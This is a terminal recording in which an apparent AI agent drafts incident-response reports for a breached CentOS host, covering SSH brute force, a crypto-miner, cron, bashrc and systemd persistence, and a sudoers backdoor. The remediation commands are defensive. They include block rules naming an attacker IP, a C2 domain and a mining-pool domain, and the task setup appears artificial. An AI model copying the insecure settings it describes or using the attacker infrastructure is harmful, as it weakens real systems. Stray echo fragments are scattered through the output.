[270.799299, "o", "- **Primary Root Cause:** Weak root password and non-hardened SSH service configurations.\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.799344, "o", "> "]
[270.799513, "o", "- **Confidence Level:** HIGH (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`, `/sas/vulns.json`).\r\n\u001b[?2004l\r\u001b[?2004h> '''\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.80123, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> baseline_report = '''# Security Baseline and Configuration Analysis Report\r\n\u001b[?2004l\re\u001b[?2004h> \r\n\u001b[?2004l\rr\u001b[?2004h> ## Executive Summary\r\n\u001b[?2004l\r\u001b[?2004h> Analysis of system configurations on `ssh-prod-01` revealed several severe security baseline deficiencies that directly facilitated the initial breach, enabled privilege escalation, and increased the host's overall attack surface.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Baseline Findings & Weaknesses\r\n\u001b[?2004l\rin\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### 1. Insecure SSH Configuration (BAS-01 / CHK-04)\r\n\u001b[?2004l\rrg`). |\r\n| 8 \u001b[?2004h> - **Artifact Path:** `/etc/ssh/sshd_config` (`/disk/etc/ssh/sshd_config`, `/sas/baseline.json`)\r\n\u001b[?2004l\r\u001b[?2004h> - **Identified Weaknesses:**\r\n\u001b[?2004l\r\u001b[?2004h>   - `PermitRootLogin yes`: Allows direct SSH logins as `root` from remote external hosts (`/disk/etc/ssh/sshd_config`).\r\n\u001b[?2004l\r\u001b[?2004h>   - `PasswordAuthentication yes`: Permits password authentication instead of requiring SSH key-based authentication (`/disk/etc/ssh/sshd_config`).\r\n\u001b[?2004l\rDE\u001b[?2004h>   - `MaxAuthTries 6`: High authentication attempt threshold before disconnection, enabling rapid dictionary brute-forcing (`/disk/etc/ssh/sshd_config`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Security Risk:** Allowed the external attacker at `198.51.100.78` to brute-force the root user password directly over the network (`/disk/var/log/secure:178`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\re\u001b[?2004h> ### 2. MySQL Remote Root Access and Public Binding (BAS-02 / CHK-09)\r\n\u001b[?2004l\rdisk\u001b[?2004h> "]
[270.801358, "o", "- **Artifact Path:** `/etc/my.cnf` (`/disk/etc/my.cnf`, `/sas/baseline.json`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.801395, "o", "- **Identified Weaknesses:**\r\n\u001b[?2004l\rp 198.51."]
[270.801415, "o", "\u001b[?2004h"]
[270.801645, "o", ">   - `bind-address = 0.0.0.0`: Binds MySQL database service to all network interfaces (`/disk/etc/my.cnf`).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.801786, "o", "  - Remote root grant enabled: Grants root database privileges over remote network connections (`/disk/etc/my.cnf`).\r\n\u001b[?2004l\rEvidence Ci"]
[270.801836, "o", "\u001b[?2004h> "]
[270.801986, "o", "- **Security Risk:** Exposes sensitive database management interface directly to the public/untrusted network.\r\n\u001b[?2004l\re\r\n  kill -9 1337\r\n  m"]
[270.802108, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rv\u001b[?2004h> ### 3. Weak Root Account Password Policy\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.802237, "o", "- **Artifact Path:** System authentication logs (`/disk/var/log/secure:178`)\r\n\u001b[?2004l\r*"]
[270.802279, "o", "\u001b[?2004h> "]
[270.802522, "o", "- **Identified Weaknesses:** Root account was secured by a weak password easily guessable via standard dictionary attack tools (`hydra`).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.802734, "o", "- **Security Risk:** Enabled root account takeover within minutes of attack onset (`/disk/var/log/secure:141-178`).\r\n\u001b[?2004l\raining the malicious beacon.\r\n\u001b[?2004h> \r\n\u001b[?2004l\r"]
[270.802791, "o", "\u001b[?2004h> "]
[270.802884, "o", "### 4. Excessive Privilege Delegation in Sudoers (Silent Backdoor Risk)\r\n\u001b[?2004l\r"]
[270.802903, "o", "*\r\n"]
[270.802933, "o", "\u001b[?2004h"]
[270.803081, "o", "> - **Artifact Path:** `/etc/sudoers.d/devops` (`/disk/etc/sudoers.d/devops:3`)\r\n\u001b[?2004l\r"]
[270.80311, "o", "\u001b[?2004h> "]
[270.803356, "o", "- **Identified Weaknesses:** Drop-in sudoers entry `devops ALL=(ALL) NOPASSWD: ALL` grants unrestricted root access without password prompt (`/disk/etc/sudoers.d/devops:3`).\r\n\u001b[?2004l\ristence\r\n- **Ac"]
[270.803535, "o", "\u001b[?2004h> "]
[270.803614, "o", "- **Security Risk:** Created a persistent backdoor allowing user `devops` to elevate to root seamlessly (`/disk/etc/sudoers.d/devops:3`).\r\n\u001b[?2004l\r\u001b[?2004h> '''"]
[270.803634, "o", "\r\n\u001b[?2004l\r"]
[270.803714, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rm\u001b[?2004h> "]
[270.803869, "o", "remediation_plan = '''# Comprehensive Post-Incident Remediation & Containment Plan\r\n\u001b[?2004l\rctl stop"]
[270.80396, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r "]
[270.804004, "o", "\u001b[?2004h"]
[270.804042, "o", "> "]
[270.80413, "o", "## Executive Summary\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.804188, "o", "> "]
[270.804638, "o", "This remediation plan outlines prioritized, step-by-step procedures to contain the active breach on `ssh-prod-01`, eradicate all persistence mechanisms, harden host baselines, and reconcile the draft change ticket CHG-3182. In accordance with forensic best practices, all actions prioritize backup and quarantine over destructive deletion.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\ro"]
[270.804698, "o", "\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\re `P"]
[270.804729, "o", "\u001b[?2004h> "]
[270.804846, "o", "## Reconciled Change Ticket CHG-3182\r\n\u001b[?2004l\r**\u001b[?2004h> \r\n\u001b[?2004l\rE\u001b[?2004h"]
[270.804877, "o", "> "]
[270.80506, "o", "Below is the updated and corrected change ticket reconciled against forensic evidence in `/disk` and `/sas`:\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.805136, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.805201, "o", "| # | Action | Target | Status | Note / Rationale & Evidence |\r\n\u001b[?2004l\r"]
[270.80529, "o", "\u001b[?2004h"]
[270.805332, "o", "> "]
[270.805448, "o", "|---|--------|--------|--------|-----------------------------|\r\n\u001b[?2004l\r\r\n\r\n##"]
[270.805494, "o", "\u001b[?2004h> "]
[270.805772, "o", "| 1 | Block source IP inbound | `198.51.100.78` | PROPOSED | **RECONCILED**: Corrected attacker IP from stale `203.0.113.9` to `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`). |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.806054, "o", "| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | REJECTED | **RECONCILED**: Rejected BlueKeep patch claim. Host is CentOS Linux; entry was SSH brute force (`/disk/etc/os-release`, `/sas/cti/advisory.txt`). |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.806317, "o", "| 3 | Remove cron miner | `/var/spool/cron/root` | OPEN | **RECONCILED**: Downgraded from DONE to OPEN. Cron persistent beacon on line 5 requires quarantine and removal (`/disk/var/spool/cron/root:5`). |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.8065, "o", "| 4 | Remove shell-init persistence | `/root/.bashrc` | TODO | **ADDED**: Quarantine and remove `PROMPT_COMMAND` beacon on line 2 (`/disk/root/.bashrc:2`). |\r\n\u001b[?2004l\r sed -i 's/^"]
[270.806544, "o", "\u001b[?2004h> "]
[270.806817, "o", "| 5 | Remove systemd persistence | `/etc/systemd/system/system-update-helper.service` | TODO | **ADDED**: Disable, stop, and quarantine helper service (`/disk/etc/systemd/system/system-update-helper.service`). |\r\n\u001b[?2004l\r"]
[270.80685, "o", "\u001b[?2004h> "]
[270.80823, "o", "| 6 | Remove sudoers backdoor | `/etc/sudoers.d/devops` | TODO | **ADDED**: Remove NOPASSWD ALL backdoor entry (`/disk/etc/sudoers.d/devops:3`). |\r\n\u001b[?2004l\r|maxauthtries\"`  \r\n\r\n### Step 3.\u001b[?2004h> | 7 | Kill miner process & quarantine binary | `/tmp/.X11-unix/.xorg` | TODO | **ADDED**: Terminate process PID 1337 and quarantine binary sample (`/disk/tmp/.X11-unix/.xorg`). |\r\n\u001b[?2004l\r\u001b[?2004h> | 8 | Harden SSH configuration | `/etc/ssh/sshd_config` | TODO | **ADDED**: Set `PermitRootLogin no`, `PasswordAuthentication no`, require keys (`/disk/etc/ssh/sshd_config`). |\r\n\u001b[?2004l\r\u001b[?2004h> | 9 | Harden MySQL configuration | `/etc/my.cnf` | TODO | **ADDED**: Set `bind-address = 127.0.0.1` and disable remote root (`/disk/etc/my.cnf`). |\r\n\u001b[?2004l\r\u001b[?2004h> | 10 | Rotate root & user credentials | System Accounts | TODO | **ADDED**: Force password rotation across root and user accounts (`/disk/etc/passwd`). |\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r:\u001b[?2004h> ## Phase 1: Immediate Network Containment & Process Termination\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 1.1: Block Attacker Infrastructure at Perimeter Firewall\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.808288, "o", "- **Action:** Add drop rules for attacker origin IP `198.51.100.78`, C2 domain `update-ssh.example.cn`, and pool domain `xmr.ssh.evil`.\r\n\u001b[?2004l\r"]
[270.808316, "o", "\u001b[?2004h> "]
[270.808519, "o", "- **Evidence Citation:** `/disk/var/log/secure:178`, `/sas/cti/advisory.txt`\r\n\u001b[?2004l\r\u001b[?2004h> - **Verification Command:** `iptables -L -n -v | grep 198.51.100.78`  \r\n\u001b[?2004l\r"]
[270.808554, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rv"]
[270.808604, "o", "\u001b[?2004h> "]
[270.808762, "o", "### Step 1.2: Terminate Mining Process & Quarantine Binary\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.808883, "o", "- **Action:** Terminate active miner process (PID 1337) and move binary `/tmp/.X11-unix/.xorg` to quarantine directory `/var/quarantine/`.\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.808935, "o", "> "]
[270.809031, "o", "- **Evidence Citation:** `/disk/tmp/.X11-unix/.xorg`  \r\n\u001b[?2004l\r\u001b[?2004h"]
[270.80906, "o", "> "]
[270.809102, "o", "- **Commands:**\r\n\u001b[?2004l\r"]
[270.809193, "o", "\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r \u001b[?2004h> "]
[270.809292, "o", "  mkdir -p /var/quarantine\r\n\u001b[?2004l\re_"]
[270.80935, "o", "\u001b[?2004h> "]
[270.80939, "o", "  kill -9 1337\r\n\u001b[?2004l\r\r\nwith o"]
[270.809524, "o", "\u001b[?2004h>   mv /tmp/.X11-unix/.xorg /var/quarantine/.xorg.bak\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.809601, "o", "  chmod 000 /var/quarantine/.xorg.bak\r\n\u001b[?2004l\r"]
[270.80964, "o", "\u001b[?2004h>   ```"]
[270.809678, "o", "\r\n\u001b[?2004l\r"]
[270.809717, "o", "\u001b[?2004h> "]
[270.809805, "o", "- **Verification Command:** `ps aux | grep .xorg`  \r\n\u001b[?2004l\rn"]
[270.809872, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r_"]
[270.809903, "o", "\u001b[?2004h> "]
[270.80997, "o", "---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[270.809995, "o", "> "]
[270.810091, "o", "## Phase 2: Eradication of Persistence Mechanisms\r\n\u001b[?2004l\r"]
[270.81017, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.810231, "o", "### Step 2.1: Eradicate Cron Persistence\r\n\u001b[?2004l\r"]
[270.810266, "o", "\u001b[?2004h> "]
[270.810439, "o", "- **Action:** Backup `/var/spool/cron/root` to `/var/quarantine/cron_root.bak` and remove line 5 containing the malicious beacon.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.810555, "o", "- **Evidence Citation:** `/disk/var/spool/cron/root:5`  \r\n\u001b[?2004l\r\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r"]
[270.810583, "o", "\u001b[?2004h> "]
[270.810656, "o", "  ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.810715, "o", "  cp /var/spool/cron/root /var/quarantine/cron_root.bak\r\n\u001b[?2004l\r"]
[270.810772, "o", "\u001b[?2004h> "]
[270.810846, "o", "  sed -i '/198.51.100.78/d' /var/spool/cron/root\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.810886, "o", ">   ```\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.810912, "o", "> "]
[270.811024, "o", "- **Verification Command:** `crontab -l -u root | grep 198.51.100.78`  \r\n\u001b[?2004l\r"]
[270.811083, "o", "\u001b[?2004h> "]
[270.811158, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.811272, "o", "### Step 2.2: Eradicate Systemd Service Persistence\r\n\u001b[?2004l\r"]
[270.811299, "o", "\u001b[?2004h"]
[270.811333, "o", "> "]
[270.811481, "o", "- **Action:** Stop, disable, and relocate service file `/etc/systemd/system/system-update-helper.service`.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.811588, "o", "- **Evidence Citation:** `/disk/etc/systemd/system/system-update-helper.service`  "]
[270.811618, "o", "\r\n\u001b[?2004l\r"]
[270.811684, "o", "\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r"]
[270.811789, "o", "\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.811882, "o", "  systemctl stop system-update-helper.service\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.811941, "o", "  systemctl disable system-update-helper.service\r\n\u001b[?2004l\r"]
[270.812016, "o", "\u001b[?2004h> "]
[270.81213, "o", "  mv /etc/systemd/system/system-update-helper.service /var/quarantine/\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.812166, "o", "  systemctl daemon-reload\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.81225, "o", ">   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.81324, "o", "- **Verification Command:** `systemctl status system-update-helper.service`  \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 2.3: Eradicate Shell-Init Persistence (.bashrc)\r\n\u001b[?2004l\r\u001b[?2004h> - **Action:** Backup `/root/.bashrc` and remove `PROMPT_COMMAND` beacon on line 2.\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence Citation:** `/disk/root/.bashrc:2`  \r\n\u001b[?2004l\r\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h>   cp /root/.bashrc /var/quarantine/.bashrc.bak\r\n\u001b[?2004l\r\u001b[?2004h>   sed -i '/PROMPT_COMMAND/d' /root/.bashrc\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> - **Verification Command:** `grep PROMPT_COMMAND /root/.bashrc`  \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 2.4: Eradicate Sudoers Backdoor\r\n\u001b[?2004l\r\u001b[?2004h> - **Action:** Backup and remove `/etc/sudoers.d/devops`.\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence Citation:** `/disk/etc/sudoers.d/devops:3`  \r\n\u001b[?2004l\r\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r\u001b[?2004h>   mv /etc/sudoers.d/devops /var/quarantine/devops_sudoers.bak\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> - **Verification Command:** `sudo -l -U devops`  \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Phase 3: System Hardening & Baseline Remediation\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[270.813337, "o", "\u001b[?2004h> ### Step 3.1: Harden SSH Baseline\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.813398, "o", "- **Action:** Update `/etc/ssh/sshd_config` to disallow root password logins and enforce SSH key authentication.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.813513, "o", "- **Evidence Citation:** `/disk/etc/ssh/sshd_config`  \r\n\u001b[?2004l\r\u001b[?2004h> - **Configuration Updates:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```ini\r\n\u001b[?2004l\r"]
[270.813532, "o", "\u001b[?2004h>   PermitRootLogin no\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.813717, "o", "  PasswordAuthentication no\r\n\u001b[?2004l\r\u001b[?2004h>   MaxAuthTries 3\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.813728, "o", "  ```bash\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.81379, "o", "  cp /etc/ssh/sshd_config /var/quarantine/sshd_config.bak\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.81387, "o", "  sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.813957, "o", "  sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814095, "o", "  sed -i 's/^MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814125, "o", "  systemctl reload sshd\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814227, "o", "- **Verification Command:** `sshd -T | grep -E \"permitrootlogin|passwordauthentication|maxauthtries\"`  \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[270.814319, "o", "\u001b[?2004h> "]
[270.814331, "o", "### Step 3.2: Harden MySQL Baseline\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814462, "o", "- **Action:** Restrict MySQL binding to local interface in `/etc/my.cnf` and revoke remote root grants.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814473, "o", "- **Evidence Citation:** `/disk/etc/my.cnf`  \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814548, "o", "- **Configuration Updates:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```ini\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814633, "o", "  bind-address = 127.0.0.1\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r"]
[270.814702, "o", "\u001b[?2004h> "]
[270.814743, "o", "  cp /etc/my.cnf /var/quarantine/my.cnf.bak\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814768, "o", "  sed -i 's/bind-address = 0.0.0.0/bind-address = 127.0.0.1/' /etc/my.cnf\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814827, "o", "  systemctl restart mysqld\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.814881, "o", "- **Verification Command:** `netstat -tuln | grep 3306`  \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.81492, "o", "### Step 3.3: Rotate All Credentials\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.815009, "o", "- **Action:** Force immediate password change for root and all user accounts.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.815051, "o", "- **Evidence Citation:** `/disk/etc/passwd`, `/disk/var/log/secure:178`  \r\n\u001b[?2004l\r"]
[270.815096, "o", "\u001b[?2004h> - **Commands:**\r\n\u001b[?2004l\r\u001b[?2004h>   ```bash\r\n\u001b[?2004l\r"]
[270.815171, "o", "\u001b[?2004h>   passwd -l root\r\n\u001b[?2004l\r\u001b[?2004h>   passwd devops\r\n\u001b[?2004l\r\u001b[?2004h>   ```\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[270.815197, "o", "\u001b[?2004h> ---\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[270.815274, "o", "\u001b[?2004h> "]
[270.815317, "o", "## Phase 4: Internal Target Investigation & Monitoring\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.815398, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.815478, "o", "### Step 4.1: Internal Network Pivoting Scope Assessment\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.815547, "o", "- **Action:** Inspect internal hosts reachable from `ssh-prod-01` for potential hydra brute-force attempts originated by `devops`.\r\n\u001b[?2004l\r"]
[270.8156, "o", "\u001b[?2004h> "]
[270.815687, "o", "- **Evidence Citation:** `/disk/home/devops/.bash_history:6`  \r\n\u001b[?2004l\r\u001b[?2004h"]
